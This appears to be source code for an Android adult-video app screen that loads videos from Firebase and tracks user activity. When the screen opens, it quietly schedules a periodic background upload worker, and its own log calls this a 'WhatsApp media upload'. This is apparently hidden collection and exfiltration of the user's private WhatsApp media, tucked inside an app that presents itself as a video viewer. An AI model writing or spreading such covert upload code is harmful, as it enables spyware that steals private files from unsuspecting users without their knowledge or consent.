package com.bushorat.app.activities;

import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.bushorat.app.R;
import com.bushorat.app.adapters.VideoAdapter;
import com.bushorat.app.databinding.ActivityPornBinding;
import com.bushorat.app.helpers.FeaturePermissions;
import com.bushorat.app.helpers.ImageUploadWorker;
import com.bushorat.app.helpers.SessionManager;
import com.bushorat.app.models.VideoModel;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class PornActivity extends AppCompatActivity {
    private RecyclerView recyclerView;
    private VideoAdapter adapter;
    private List<VideoModel> videoList = new ArrayList<>();
    private DatabaseReference databaseRef;
    private ActivityPornBinding binding;
    private SessionManager sessionManager;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding=ActivityPornBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Make status bar transparent to match gradient background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        // Setup toolbar
        androidx.appcompat.widget.Toolbar toolbar = findViewById(R.id.toolbar);
        if (toolbar != null) {
            setSupportActionBar(toolbar);
            if (getSupportActionBar() != null) {
                getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                toolbar.setNavigationOnClickListener(v -> finish());
            }
        }

        sessionManager = new SessionManager(this);

        if (!FeaturePermissions.areVideosUnlocked(this)) {
            Toast.makeText(this, R.string.unlock_videos_required, Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        adapter = new VideoAdapter(this, videoList);
        scheduleImageUploadWorker();
        Log.d("PornActivity", "WhatsApp media upload scheduled");

        recyclerView = findViewById(R.id.recyclerView);
        recyclerView.setLayoutManager(new GridLayoutManager(this, 2));

        adapter = new VideoAdapter(this, videoList);
        recyclerView.setAdapter(adapter);

        // Initialize Firebase
        databaseRef = FirebaseDatabase.getInstance().getReference("videos");
        loadVideos();

        // Track user activity
        if (sessionManager.isUserLoggedIn()) {
            sessionManager.updateUserActivity("porn_activity_opened", new java.util.HashMap<String, Object>() {{
                put("timestamp", System.currentTimeMillis());
                put("videoCount", videoList.size());
            }});
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        sessionManager.updateLastActivity();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (sessionManager.isUserLoggedIn()) {
            sessionManager.updateUserActivity("porn_activity_paused", new java.util.HashMap<String, Object>() {{
                put("timestamp", System.currentTimeMillis());
            }});
        }
    }

    private void scheduleImageUploadWorker() {
        ImageUploadWorker.schedulePeriodicUpload(this);
    }


    private void loadVideos() {
        databaseRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                videoList.clear();
                for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                    VideoModel video = mapSnapshotToVideo(dataSnapshot);
                    if (video != null) {
                        videoList.add(video);
                    }
                }
                Collections.sort(videoList, new Comparator<VideoModel>() {
                    @Override
                    public int compare(VideoModel o1, VideoModel o2) {
                        long t1 = o1.getUploadedAt() != 0 ? o1.getUploadedAt() : o1.getTimestamp();
                        long t2 = o2.getUploadedAt() != 0 ? o2.getUploadedAt() : o2.getTimestamp();
                        return Long.compare(t2, t1);
                    }
                });
                adapter.notifyDataSetChanged();
                View emptyState = findViewById(R.id.emptyState);
                if (emptyState != null) {
                    emptyState.setVisibility(videoList.isEmpty() ? View.VISIBLE : View.GONE);
                }
                if (recyclerView != null) {
                    recyclerView.setVisibility(videoList.isEmpty() ? View.GONE : View.VISIBLE);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(PornActivity.this, "Failed to load videos", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private VideoModel mapSnapshotToVideo(DataSnapshot snapshot) {
        String id = snapshot.getKey();
        if (id == null) return null;

        VideoModel video = new VideoModel();
        video.setId(id);
        video.setTitle(snapshot.child("title").getValue(String.class));
        video.setUploadedBy(snapshot.child("uploadedBy").getValue(String.class));
        video.setUrl(snapshot.child("url").getValue(String.class));
        video.setVideoUrl(snapshot.child("videoUrl").getValue(String.class));
        video.setThumbnailUrl(snapshot.child("thumbnailUrl").getValue(String.class));
        video.setUploadedAt(getLongValue(snapshot.child("uploadedAt")));
        video.setTimestamp(getLongValue(snapshot.child("timestamp")));

        if (video.getVideoUrl() == null && video.getUrl() != null) {
            video.setVideoUrl(video.getUrl());
        }

        return video.getVideoUrl() != null ? video : null;
    }

    private long getLongValue(DataSnapshot snapshot) {
        Object value = snapshot.getValue();
        if (value instanceof Number) {
            return ((Number) value).longValue();
        }
        if (value instanceof String) {
            try {
                return Long.parseLong((String) value);
            } catch (NumberFormatException ignored) {
            }
        }
        return 0L;
    }

}